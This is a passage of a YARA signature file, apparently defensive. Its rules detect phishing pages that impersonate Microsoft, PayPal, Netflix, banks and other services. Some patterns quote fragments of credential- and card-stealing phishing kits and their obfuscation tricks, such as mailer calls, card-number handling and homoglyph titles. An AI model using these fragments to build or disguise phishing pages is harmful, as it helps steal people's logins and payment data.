    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00466
}

rule html_phishing_microsoft_002 : phishing
{
    strings:
        $trigger = "<title>Microsoft Excel<"
    condition:
        $trigger
}

rule html_phishing_microsoft_003 : phishing
{
    strings:
        $trigger = "2016 Microsoft<"
    condition:
        $trigger and PR00042 and PR00312
}

rule html_phishing_microsoft_004 : phishing
{
    strings:
        $trigger = ">Rename your personal Microsoft"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_005 : phishing
{
    strings:
        $trigger = "\"Password\" type=\"password\" name=\"passwd\" value=\"\""
    condition:
        $trigger and PR00042 and PR00044
}

rule html_phishing_microsoft_006 : phishing
{
    strings:
        $trigger = "Microsoft"
        $html_phishing_microsoft_006_w0 = "helpdesk.ainfosec.com"
    condition:
        $trigger and PR00441 and not $html_phishing_microsoft_006_w0
}

private rule PR00467 : trigger
{
    strings:
        $ps0 = "<title>Sign in to your account</title>"
    condition:
        $ps0
}

rule html_phishing_microsoft_006_02 : phishing
{
    strings:
        $trigger = "Microsoft"
    condition:
        $trigger and PR00467
}

private rule PR00468 : trigger
{
    strings:
        $ps0 = "content=\"Outlook.com is a free, personal email"
    condition:
        $ps0
}

rule html_phishing_microsoft_007 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00468
}

rule html_phishing_microsoft_008 : phishing
{
    strings:
        $trigger = "<li><a href=\"javascript:void(0);\">Document</a></li>"
    condition:
        $trigger and PR00042
}

private rule PR00469 : trigger
{
    strings:
        $ps0 = "window.top.location.href = \"https://login.microsoftonline.com"
    condition:
        $ps0
}

rule html_phishing_microsoft_009 : phishing
{
    strings:
        $trigger = "$subj"
    condition:
        $trigger and PR00469
}

rule html_phishing_microsoft_010 : phishing
{
    strings:
        $trigger = "<title>Excel Online"
    condition:
        $trigger
}

rule html_phishing_microsoft_011 : phishing
{
    strings:
        $trigger = "<title>Office365 Verification</title>"
    condition:
        $trigger
}

private rule PR00470 : trigger
{
    strings:
        $ps0 = "<title>One Drive"
    condition:
        $ps0
}

rule html_phishing_microsoft_012 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00470
}

private rule PR00471 : trigger
{
    strings:
        $ps0 = "<title>Sign in to your Microsoft"
    condition:
        $ps0
}

rule html_phishing_microsoft_013 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00471
}

private rule PR00472 : trigger
{
    strings:
        $ps0 = "Sign in to Office 365</title>"
    condition:
        $ps0
}

rule html_phishing_microsoft_014 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00472
}

rule html_phishing_microsoft_015 : phishing
{
    strings:
        $trigger = "<img class=\"logo\" role=\"presentation\" pngsrc=\"files/microsoft_logo.png?x="
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_016 : phishing
{
    strings:
        $trigger = "<title>Microsoft OneDrive</title>"
    condition:
        $trigger
}

rule html_phishing_microsoft_017 : phishing
{
    strings:
        $trigger = "INDOWS SIGN IN</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_018 : phishing
{
    strings:
        $trigger = "<title>Microsft-services"
    condition:
        $trigger
}

rule html_phishing_microsoft_019 : phishing
{
    strings:
        $trigger = "login.microsoftonline.com/logout.srf"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_020 : phishing
{
    strings:
        $trigger = ">\xc2\xa9 2019 Microsoft"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_021 : phishing
{
    strings:
        $trigger = "<link rel=\"shortcut icon\" href=\"https://secure.aadcdn.microsoftonline-p.com/"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_022 : phishing
{
    strings:
        $trigger = "href=\"https://privacy.microsoft.com"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_023 : phishing
{
    strings:
        $trigger = "=\"Create a Microsoft account\">"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_024 : phishing
{
    strings:
        $trigger = "Office 365 Login"
    condition:
        $trigger and PR00042 and PR00044
}

rule html_phishing_microsoft_025 : phishing
{
    strings:
        $trigger = "Microsoft Excel Online"
    condition:
        $trigger and PR00042
}

private rule PR00473 : trigger
{
    strings:
        $ps0 = "Password"
    condition:
        $ps0
}

rule html_phishing_microsoft_026 : phishing
{
    strings:
        $trigger = "mail.live.com"
    condition:
        $trigger and PR00042 and PR00046 and PR00473
}

rule html_phishing_microsoft_027 : phishing
{
    strings:
        $trigger = "<title>Microsoft \xe3\x82\xa2"
    condition:
        $trigger
}

private rule PR00474 : trigger
{
    strings:
        $ps0 = "<title>SharePoint Storage Portal"
    condition:
        $ps0
}

rule html_phishing_microsoft_028 : phishing
{
    strings:
        $trigger = "Login"
    condition:
        $trigger and PR00474
}

rule html_phishing_microsoft_029 : phishing
{
    strings:
        $trigger = "Outlook</title>"
    condition:
        $trigger and PR00042 and PR00044
}

rule html_phishing_microsoft_030 : phishing
{
    strings:
        $trigger = "<title>&#x53;&#x69;&#x67;&#x6E;&#x20;&#x69;&#x6E;&#x20;&#x74;&#x6F;&#x20;&#x79;&"
    condition:
        $trigger
}

rule html_phishing_microsoft_031 : phishing
{
    strings:
        $trigger = "microsoft-365/sharepoint"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_032 : phishing
{
    strings:
        $trigger = "Sign in with office 365"
    condition:
        $trigger and PR00371 and PR00050
}

rule html_phishing_microsoft_033 : phishing
{
    strings:
        $trigger = "ng-app=\"loginApp\""
    condition:
        $trigger and PR00042 and PR00046
}

rule html_phishing_microsoft_034 : phishing
{
    strings:
        $trigger = "Sign in with Office 365"
    condition:
        $trigger and PR00042 and PR00046
}

rule html_phishing_microsoft_035 : phishing
{
    strings:
        $trigger = "Microsoft | Login"
    condition:
        $trigger and PR00042
}

rule html_phishing_microsoft_036 : phishing
{
    strings:
        $trigger = "<title>Sharing Link Validation"
    condition:
        $trigger and PR00044
}

private rule PR00475 : trigger
{
    strings:
        $ps0 = "&#x4d;&#x69;&#x63;&#x72;&#x6f;&#x73;&#x6f;&#x66;&#x74;"
    condition:
        $ps0
}

rule html_phishing_microsoft_037 : phishing
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00475
}

private rule PR00476 : trigger
{
    strings:
        $ps0 = ">Mystery Shoppers"
    condition:
        $ps0
}

rule html_phishing_mysteryshoppers_001 : phishing
{
    strings:
        $trigger = "method=post action="
    condition:
        $trigger and PR00476 and PR00378
}

private rule PR00477 : trigger
{
    strings:
        $ps0 = "isProvided(formElem)"
    condition:
        $ps0
}

rule html_phishing_mysteryshoppers_001_02 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00477
}

rule html_phishing_nationalbankofcanada_001 : phishing
{
    strings:
        $trigger = "<title>National Bank Online</title>"
    condition:
        $trigger
}

rule html_phishing_natwest_001 : phishing
{
    strings:
        $trigger = "National Westminster Bank Plc</span></li>"
    condition:
        $trigger
}

rule html_phishing_naver_001 : phishing
{
    strings:
        $trigger = "<title>Naver Sign in"
    condition:
        $trigger
}

rule html_phishing_netbank_001 : phishing
{
    strings:
        $trigger = "<title>Netbank Internet Banking</title>"
    condition:
        $trigger
}

private rule PR00478 : trigger
{
    strings:
        $ps0 = ">Netflix"
    condition:
        $ps0
}

rule html_phishing_netflix_001 : phishing
{
    strings:
        $trigger = ".php\" id=\"login\" autocomplete=\"off\" method=\"post"
    condition:
        $trigger and PR00042 and PR00478
}

rule html_phishing_netflix_002 : phishing
{
    strings:
        $trigger = "ng our services uniterrupted.<span class=\"Apple-converted-space\">&nbsp;<"
    condition:
        $trigger and PR00287
}

private rule PR00479 : trigger
{
    strings:
        $ps0 = "optiRealPersonContent\" class=\"livechat chat-button window-open text-online video-offline\"><span class=\"hidden\">Live Chat</span>"
    condition:
        $ps0
}

rule html_phishing_netflix_003 : phishing
{
    strings:
        $trigger = "action=\"submit.php\""
    condition:
        $trigger and PR00042 and PR00479
}

rule html_phishing_netflix_004 : phishing
{
    strings:
        $trigger = "echo '**** **** **** '.substr($card,-"
    condition:
        $trigger and PR00042
}

private rule PR00480 : trigger
{
    strings:
        $ps0 = "Card: \".$_SESSION["
    condition:
        $ps0
}

rule html_phishing_netflix_005 : phishing
{
    strings:
        $trigger = "header(\"Location: done.php\");"
    condition:
        $trigger and PR00480
}

rule html_phishing_netflix_006 : phishing
{
    strings:
        $trigger = "Security - Netflix<"
    condition:
        $trigger and PR00042
}

private rule PR00481 : trigger
{
    strings:
        $ps0 = ">Autentisering"
    condition:
        $ps0
}

rule html_phishing_netflix_007 : phishing
{
    strings:
        $trigger = "netflix"
    condition:
        $trigger and PR00481 and PR00378
}

rule html_phishing_netvigator_001 : phishing
{
    strings:
        $trigger = "=\"gray75_11\"><a href=\"https://profile.netvigator.com/netpass/servlet/NPMainServlet?action"
    condition:
        $trigger
}

rule html_phishing_nfcu_001 : phishing
{
    strings:
        $trigger = "title>Navy Federal Credit Union"
    condition:
        $trigger and PR00042
}

rule html_phishing_nickel_001 : phishing
{
    strings:
        $trigger = "<title>Compte-Nickel - Verification"
    condition:
        $trigger
}

rule html_phishing_O2_001 : phishing
{
    strings:
        $trigger = "My O2 account</title>"
    condition:
        $trigger and PR00042
}

private rule PR00482 : trigger
{
    strings:
        $ps0 = "var file"
    condition:
        $ps0
}

private rule PR00483 : trigger
{
    strings:
        $ps0 = "type: 'POST"
    condition:
        $ps0
}

rule html_phishing_office365_001 : phishing
{
    strings:
        $trigger = "Office 365"
    condition:
        $trigger and PR00371 and PR00050 and PR00482 and PR00483
}

private rule PR00484 : trigger
{
    strings:
        $ps0 = "<title>onedrive</title>"
    condition:
        $ps0
}

rule html_phishing_onedrive_001 : phishing
{
    strings:
        $trigger = "var x = document.forms[\"onedrive\"][\"email\"].value;"
    condition:
        $trigger and PR00281 and PR00484
}

private rule PR00485 : trigger
{
    strings:
        $ps0 = "this.open(url"
    condition:
        $ps0
}

rule html_phishing_onedrive_002 : phishing
{
    strings:
        $trigger = "<title>OneDrive"
    condition:
        $trigger and PR00485
}

rule html_phishing_onedrive_003 : phishing
{
    strings:
        $trigger = "\xc2\xa9 2018 Microsoft One Drive"
    condition:
        $trigger and PR00042
}

rule html_phishing_onedrive_004 : phishing
{
    strings:
        $trigger = "OneDrive</title>"
    condition:
        $trigger and PR00042
}

private rule PR00486 : trigger
{
    strings:
        $ps0 = "OneDrive - Download files"
    condition:
        $ps0
}

rule html_phishing_onedrive_005 : phishing
{
    strings:
        $trigger = "Microsoft"
    condition:
        $trigger and PR00042 and PR00486
}

rule html_phishing_onlinebanking_001 : phishing
{
    strings:
        $trigger = "<title>Online Banking - Customer ID Recovery</title>"
    condition:
        $trigger
}

private rule PR00487 : trigger
{
    strings:
        $ps0 = "content=\"0; URL= data:text/html;charset=utf-8;base64,DQo8IURPQ1RZUEUgaHRtb"
    condition:
        $ps0
}

rule html_phishing_onlinebanking_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00487
}

rule html_phishing_onlinebanking_004 : phishing
{
    strings:
        $trigger = "<title>3-D Secure Anmeldung"
    condition:
        $trigger
}

private rule PR00488 : trigger
{
    strings:
        $ps0 = "<form name=\"PHANTOM\" id=\"PHANTOM\" method=\"POST\" action=\"ph.php\""
    condition:
        $ps0
}

rule html_phishing_onlinebanking_005 : phishing
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR00488
}

rule html_phishing_ourtime_001 : phishing
{
    strings:
        $trigger = "<title>OurTime.com"
    condition:
        $trigger
}

private rule PR00489 : trigger
{
    strings:
        $ps0 = "www.outitgoes.com/images/bg_loginbox.png"
    condition:
        $ps0
}

rule html_phishing_outitgoes_001 : phishing
{
    strings:
        $trigger = "<title>WebMail</title>"
    condition:
        $trigger and PR00489
}

rule html_phishing_outlook_001 : phishing
{
    strings:
        $trigger = "<title>Outlook - Sign In"
    condition:
        $trigger
}

private rule PR00490 : trigger
{
    strings:
        $ps0 = "Microsoft Exchange Server"
    condition:
        $ps0
}

rule html_phishing_outlook_002 : phishing
{
    strings:
        $trigger = "<title>Microsoft Outlook Web Access<"
    condition:
        $trigger and PR00490
}

private rule PR00491 : trigger
{
    strings:
        $ps0 = "<title>Thank You</title>"
    condition:
        $ps0
}

rule html_phishing_outlook_003 : phishing
{
    strings:
        $trigger = ">Outlook.com<"
    condition:
        $trigger and PR00491
}

private rule PR00492 : trigger
{
    strings:
        $ps0 = "<title>Outlook Web App"
    condition:
        $ps0
}

rule html_phishing_outlook_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00492
}

rule html_phishing_outlook_005 : phishing
{
    strings:
        $trigger = ">Sign in to Outlook"
    condition:
        $trigger and PR00042
}

private rule PR00493 : trigger
{
    strings:
        $ps0 = "paypal"
    condition:
        $ps0
}

rule html_phishing_paypal_001 : phishing
{
    strings:
        $trigger = "content=\"PayPal is the safer, easier way"
    condition:
        $trigger and PR00493
}

rule html_phishing_paypal_001_004 : phishing
{
    strings:
        $trigger = "<title> Update Accounts - PayPal"
    condition:
        $trigger
}

rule html_phishing_paypal_001_005 : phishing
{
    strings:
        $trigger = "content=\"PayPal is the faster, safer way"
    condition:
        $trigger and PR00493
}

private rule PR00494 : trigger
{
    strings:
        $ps0 = "Confirm debit or credit card - PayPal"
    condition:
        $ps0
}

rule html_phishing_paypal_001_006 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00494
}

private rule PR00495 : trigger
{
    strings:
        $ps0 = "class=\"nonjsAlert\">NOTE: Many features on the PayPal "
    condition:
        $ps0
}

rule html_phishing_paypal_001_008 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00495
}

private rule PR00496 : trigger
{
    strings:
        $ps0 = "<title>Security - PayPal Europe</title>"
    condition:
        $ps0
}

rule html_phishing_paypal_001_009 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00496
}

rule html_phishing_paypal_001_010 : phishing
{
    strings:
        $trigger = "<title>W\xc3\x90\xc2\xb5l\xc3\x91\xc2\x81\xc3\x90\xc2\xbem\xc3\x90\xc2\xb5 T\xc3\x90\xc2\xbe \xc3\x90 \xc3\x90\xc2\xb0\xc3\x91\xc6\x92\xc3\x91\xe2\x82\xac\xc3\x90\xc2\xb0l.</title>"
    condition:
        $trigger
}

private rule PR00497 : trigger
{
    strings:
        $ps0 = "=========== VECTIM PC"
    condition:
        $ps0
}

rule html_phishing_paypal_002 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR00497
}

rule html_phishing_paypal_002_02 : phishing
{
    strings:
        $trigger = " PayPaI</title>"
    condition:
        $trigger and PR00042
}

private rule PR00498 : trigger
{
    strings:
        $ps0 = "content=\"Sign Up for PayPal:"
    condition:
        $ps0
}

rule html_phishing_paypal_003 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00498
}

rule html_phishing_paypal_004 : phishing
{
    strings:
        $trigger = "header(\"Location: http://www.paypal."
    condition:
        $trigger
}

rule html_phishing_paypal_006 : phishing
{
    strings:
        $trigger = "<title>PayPal - Bank Account Number</title>"
    condition:
        $trigger
}

rule html_phishing_paypal_007 : phishing
{
    strings:
        $trigger = "<title>PayPal&trade;<"
    condition:
        $trigger
}

private rule PR00499 : trigger
{
    strings:
        $ps0 = "<title>PayPal Service Update<"
    condition:
        $ps0
}

rule html_phishing_paypal_008 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00499
}

private rule PR00500 : trigger
{
    strings:
        $ps0 = "<%74%69%74%6C%65> %4C%6F%67%69%6E | %50%61%79%50%61%6C %53%65%63%75%72%69%74%79</%74"
    condition:
        $ps0
}

rule html_phishing_paypal_009 : phishing
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00500
}

rule html_phishing_paypal_010 : phishing
{
    strings:
        $trigger = "<title>Login - PayPal</title>"
    condition:
        $trigger
}

rule html_phishing_paypal_010_02 : phishing
{
    strings:
        $trigger = "Login - P&alpha;yP&alpha;l"
    condition:
        $trigger and PR00042
}

private rule PR00501 : trigger
{
    strings:
        $ps0 = "<title>Update payment information</title>"
    condition:
        $ps0
}

rule html_phishing_paypal_010_03 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00501
}

private rule PR00502 : trigger
{
    strings:
        $ps0 = "<title>File Upload Form</title>"
    condition:
        $ps0
}

rule html_phishing_paypal_010_04 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00502
}

private rule PR00503 : trigger
{
    strings:
        $ps0 = "ersonal information update</title>"
    condition:
        $ps0
}

rule html_phishing_paypal_010_05 : phishing
{
    strings:
        $trigger = "<title>"
    condition:
        $trigger and PR00503 and PR00493
}

rule html_phishing_paypal_011 : phishing
{
    strings:
        $trigger = "<title>Error - Login - PayPal</title>"
    condition:
        $trigger
}

rule html_phishing_paypal_012 : phishing
{
    strings:
        $trigger = "<title>Your account is Limited</title>"
    condition:
        $trigger and PR00493
}

private rule PR00504 : trigger
{
    strings:
        $ps0 = ">Log in to your PayPal account as soon as possible"
    condition:
        $ps0
}

rule html_phishing_paypal_013 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00504
}

rule html_phishing_paypal_014 : phishing
{
    strings:
        $trigger = ">Paypal Valid Mail Checker"
    condition:
        $trigger and PR00042
}

rule html_phishing_paypal_015 : phishing
{
    strings:
        $trigger = ">P<span><font>a</font></span>y</font><font color=\"#0098db\">Pal<"
    condition:
        $trigger and PR00247
}

rule html_phishing_paypal_016 : phishing
{
    strings:
        $trigger = "\\x23\\x63\\x63\\x5F\\x6E\\x75\\x6D\\x62\\x65\\x72"
    condition:
        $trigger and PR00332
}

private rule PR00505 : trigger
{
    strings:
        $ps0 = "\\x74\\x69\\x74\\x6C\\x65\",\"\\x50\\x61\\x79\\x50\\x61\\x6C\\x20\\x2D\\x20\\x54\\x68\\x61\\x6E\\x6B\\x73\\x2E"
    condition:
        $ps0
}

rule html_phishing_paypal_016_02 : phishing
{
    strings:
        $trigger = "var _"
    condition:
        $trigger and PR00505
}

rule html_phishing_paypal_016_03 : phishing
{
    strings:
        $trigger = "\\x23\\x62\\x74\\x6E\\x4C\\x6F\\x67\\x69\\x6E\",\"\\x23\\x62\\x74\\x6E\\x5F\\x6D\\x79\\x61\\x63\\x63\\x6F\\x75\\x6E\\x74"
    condition:
        $trigger and PR00332
}

private rule PR00506 : trigger
{
    strings:
        $ps0 = "Welcome</title>"
    condition:
        $ps0
}

private rule PR00507 : trigger
{
    strings:
        $ps0 = "POST"
    condition:
        $ps0
}

rule html_phishing_paypal_017 : phishing
{
    strings:
        $trigger = "\"Please enter your PayPal User ID\""
    condition:
        $trigger and PR00506 and PR00507
}

private rule PR00508 : trigger
{
    strings:
        $ps0 = "<title>-PayPal-</title>"
    condition:
        $ps0
}

rule html_phishing_paypal_018 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00508
}

rule html_phishing_paypal_019 : phishing
{
    strings:
        $trigger = "<title>Secure login - PayPal</title>"
    condition:
        $trigger
}

private rule PR00509 : trigger
{
    strings:
        $ps0 = "<title>Log in to your PayPal account</title>"
    condition:
        $ps0
}

rule html_phishing_paypal_020 : phishing
{
    strings:
        $trigger = "paypal"
    condition:
        $trigger and PR00509
}

rule html_phishing_paypal_021 : phishing
{
    strings:
        $trigger = "<title>L\xce\xbfg in t\xce\xbf y\xce\xbfur \xce\xa1ay\xce\xa1al acc\xce\xbfunt<"
    condition:
        $trigger
}

rule html_phishing_paypal_022 : phishing
{
    strings:
        $trigger = "<title> PayPaI : Next Step</title>"
    condition:
        $trigger
}

rule html_phishing_paypal_023 : phishing
{
    strings:
        $trigger = "<title>Log in to your PayPaI account"
    condition:
        $trigger and PR00281
}

rule html_phishing_paypal_024 : phishing
{
    strings:
        $trigger = "<title>PayPaI"
    condition:
        $trigger
}

rule html_phishing_paypal_025 : phishing
{
    strings:
        $trigger = "Login - PayPal"
    condition:
        $trigger and PR00042
}

// MANUAL FIX NECESSARY
rule html_phishing_paypal_026 : phishing
{
    strings:
        $trigger = "<title"
        $html_phishing_paypal_026_r0 = /[pP][aA][yY][pP][aA][lL].[\s]*[iI][nN][cC].[\s]*[aA][lL][lL][\s]*[rR][iI][gG][hH][tT][sS][\s]*[rR][eE][sS][eE][rR][vV][eE][dD]/
    condition:
        $trigger and $html_phishing_paypal_026_r0
}

rule html_phishing_paypal_027 : phishing
{
    strings:
        $trigger = "Pay Pal. All rights reserved."
    condition:
        $trigger and PR00493
}

private rule PR00510 : trigger
{
    strings:
        $ps0 = "<div style="
    condition:
        $ps0
}

rule html_phishing_paypal_028 : phishing
{
    strings:
        $trigger = ";'>PAYPAL LOGIN</font>"
    condition:
        $trigger and PR00510
}

private rule PR00511 : trigger
{
    strings:
        $ps0 = "> Your paypal team</p>"
    condition:
        $ps0
}

rule html_phishing_paypal_029 : phishing
{
    strings:
        $trigger = "top:"
    condition:
        $trigger and PR00287 and PR00511
}

rule html_phishing_piraeus_001 : phishing
{
    strings:
        $trigger = "Piraeus Bank</title>"
    condition:
        $trigger and PR00042
}

private rule PR00512 : trigger
{
    strings:
        $ps0 = "<title>PNC - PERSONAL BANKING</title>"
    condition:
        $ps0
}

rule html_phishing_pnc_banking_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00512
}

private rule PR00513 : trigger
{
    strings:
        $ps0 = "<title>PNC Online Banking</title>"
    condition:
        $ps0
}

rule html_phishing_pnc_banking_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00513
}

private rule PR00514 : trigger
{
    strings:
        $ps0 = "POF.com &trade; The Leading Free Online Dating Site for Singles &amp; Personals</title>"
    condition:
        $ps0
}

rule html_phishing_POF_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00514
}

private rule PR00515 : trigger
{
    strings:
        $ps0 = "Qantas Airways Limited ABN"
    condition:
        $ps0
}

rule html_phishing_qantas_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00281 and PR00515
}

rule html_phishing_rackspace_001 : phishing
{
    strings:
        $trigger = "Rackspace Webmail"
    condition:
        $trigger and PR00042
}

private rule PR00516 : trigger
{
    strings:
        $ps0 = "To Top</span><img id=\"pageTop\" src=\"https://www6.rbc.com//webapp/ukv0/signin/javax"
    condition:
        $ps0
}

rule html_phishing_rbc_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00516
}

rule html_phishing_rbc_002 : phishing
{
    strings:
        $trigger = "<title>Personal Verification Questions - RBC Online Banking<"
    condition:
        $trigger
}

rule html_phishing_redirect_002 : phishing
{
    strings:
        $trigger = "<title>Bancomer.com"
    condition:
        $trigger
}

private rule PR00517 : trigger
{
    strings:
        $ps0 = "don't tell people to `click`"
    condition:
        $ps0
}

private rule PR00518 : trigger
{
    strings:
        $ps0 = ">link to Verification</a>"
    condition:
        $ps0
}

rule html_phishing_redirect_003 : phishing
{
    strings:
        $trigger = "<title>Page Redirection</title>"
    condition:
        $trigger and PR00517 and PR00518
}

rule html_phishing_redirect_004 : phishing
{
    strings:
        $trigger = "echo(\"Loading You to the main page , Please Wait...\")"
    condition:
        $trigger and PR00042
}

private rule PR00519 : trigger
{
    strings:
        $ps0 = ">Scan Complete: Safe Link</p><button"
    condition:
        $ps0
}

rule html_phishing_redirect_005 : phishing
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00371 and PR00519
}

private rule PR00520 : trigger
{
    strings:
        $ps0 = "if(window.location.href.split('#')[1]>0){"
    condition:
        $ps0
}

rule html_phishing_redirect_006 : phishing
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00520
}

private rule PR00521 : trigger
{
    strings:
        $ps0 = "Remax - Secure Login"
    condition:
        $ps0
}

rule html_phishing_remax_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00521
}

rule html_phishing_RHB_001 : phishing
{
    strings:
        $trigger = "RHB Internet Banking</title>"
    condition:
        $trigger
}

rule html_phishing_roundcube_001 : phishing
{
    strings:
        $trigger = "var rcmail = new rcube_webmail();"
    condition:
        $trigger and PR00042
}

rule html_phishing_Santander_001 : phishing
{
    strings:
        $trigger = ">Santander Online Banking"
    condition:
        $trigger
}

private rule PR00522 : trigger
{
    strings:
        $ps0 = "Santander"
    condition:
        $ps0
}

rule html_phishing_santander_002 : phishing
{
    strings:
        $trigger = "\"register.cpf\" class=\"input_txt\" onblur=\"validateCPF(this);\""
    condition:
        $trigger and PR00042 and PR00522
}

rule html_phishing_santander_003 : phishing
{
    strings:
        $trigger = "<a href=\"#LINKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"
    condition:
        $trigger and PR00042 and PR00522
}

rule html_phishing_scotiabank_001 : phishing
{
    strings:
        $trigger = "ScotiaVerify TM"
    condition:
        $trigger and PR00042
}

rule html_phishing_scotiabank_002 : phishing
{
    strings:
        $trigger = "Scotia OnLine:"
    condition:
        $trigger and PR00042
}

private rule PR00523 : trigger
{
    strings:
        $ps0 = "SecureSignup.net Special offer and Discoun"
    condition:
        $ps0
}

rule html_phishing_SecureSignup_net_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00523
}

private rule PR00524 : trigger
{
    strings:
        $ps0 = "&#39034;&#20016;&#36895;&#36816;"
    condition:
        $ps0
}

rule html_phishing_sfexpress_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00524
}

rule html_phishing_sfr_003 : phishing
{
    strings:
        $trigger = "<title>SFR - Confirmation des donn"
    condition:
        $trigger
}

rule html_phishing_sfr_004 : phishing
{
    strings:
        $trigger = "<title>SFR - Mise"
    condition:
        $trigger
}

rule html_phishing_sfr_005 : phishing
{
    strings:
        $trigger = "<title>Espace Client SFR"
    condition:
        $trigger
}

rule html_phishing_sky_001 : phishing
{
    strings:
        $trigger = "<title>Sky - Sign in"
    condition:
        $trigger
}

rule html_phishing_smartsheet_001 : phishing
{
    strings:
        $trigger = "<title>Log In | Smartsheet"
    condition:
        $trigger
}

rule html_phishing_social_security_001 : phishing
{
    strings:
        $trigger = "<title>Please Enter Security Challenge</title>"
    condition:
        $trigger
}

rule html_phishing_societegenerale_001 : phishing
{
    strings:
        $trigger = "<title>Soci\xc3\xa9t\xc3\xa9 G\xc3\xa9n\xc3\xa9rale |"
    condition:
        $trigger
}

rule html_phishing_squirrelmail_001 : phishing
{
    strings:
        $trigger = "SquirrelMail version "
    condition:
        $trigger and PR00042
}

rule html_phishing_ssfcu_001 : phishing
{
    strings:
        $trigger = "<title>myBranch Online Banking"
    condition:
        $trigger
}

private rule PR00525 : trigger
{
    strings:
        $ps0 = "<title>Internet banking</title>"
    condition:
        $ps0
}

rule html_phishing_standardbank_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00525
}

rule html_phishing_stgeorge_001 : phishing
{
    strings:
        $trigger = "St.George Internet Banking - Logon"
    condition:
        $trigger
}

private rule PR00526 : trigger
{
    strings:
        $ps0 = "ST GEORGE BANK : Account Verified<"
    condition:
        $ps0
}

rule html_phishing_stgeorge_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00526
}

private rule PR00527 : trigger
{
    strings:
        $ps0 = "<title>Stripe: Login</title>"
    condition:
        $ps0
}

rule html_phishing_stripe_001 : phishing
{
    strings:
        $trigger = "https://a.stripecdn.com/manage/assets"
    condition:
        $trigger and PR00527
}

rule html_phishing_stripe_002 : phishing
{
    strings:
        $trigger = "<title>Stripe: Login"
    condition:
        $trigger
}

private rule PR00528 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\""
    condition:
        $ps0
}

rule html_phishing_suddenlink_001 : phishing
{
    strings:
        $trigger = "CTx0aXRsZT5TdWRkZW5saW5rIC0gTG9n"
    condition:
        $trigger and PR00528
}

rule html_phishing_tonline_001 : phishing
{
    strings:
        $trigger = "<title>Telekom-Login"
    condition:
        $trigger
}

private rule PR00529 : trigger
{
    strings:
        $ps0 = "esetPasswordCheck?d=telefonica.net"
    condition:
        $ps0
}

rule html_phishing_telefonica_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00529 and PR00281
}

private rule PR00530 : trigger
{
    strings:
        $ps0 = "correo.telefonica.net/cp/"
    condition:
        $ps0
}

rule html_phishing_telefonica_001_02 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR00530 and PR00273
}

private rule PR00531 : trigger
{
    strings:
        $ps0 = "go-telegram"
    condition:
        $ps0
}

rule html_phishing_telegram_mailer_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00322 and PR00046 and PR00531
}

rule html_phishing_telekom_deutschland_001 : phishing
{
    strings:
        $trigger = "&copy; Telekom Deutschland GmbH"
    condition:
        $trigger and PR00042 and PR00281
}

rule html_phishing_telenor_001 : phishing
{
    strings:
        $trigger = "Telenor \xc2\xa9"
    condition:
        $trigger and PR00042
}

rule html_phishing_telstra_001 : phishing
{
    strings:
        $trigger = ">Webmail - Telstra"
    condition:
        $trigger and PR00042
}

rule html_phishing_telstra_002 : phishing
{
    strings:
        $trigger = ">Pay a bill - Account services - Telstra"
    condition:
        $trigger and PR00042
}

private rule PR00532 : trigger
{
    strings:
        $ps0 = "Tenant Turner, Inc."
    condition:
        $ps0
}

rule html_phishing_tenantturner_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00532 and PR00046
}

private rule PR00533 : trigger
{
    strings:
        $ps0 = "<title>The Pirate Bay"
    condition:
        $ps0
}

rule html_phishing_thepiratebay_001 : phishing
{
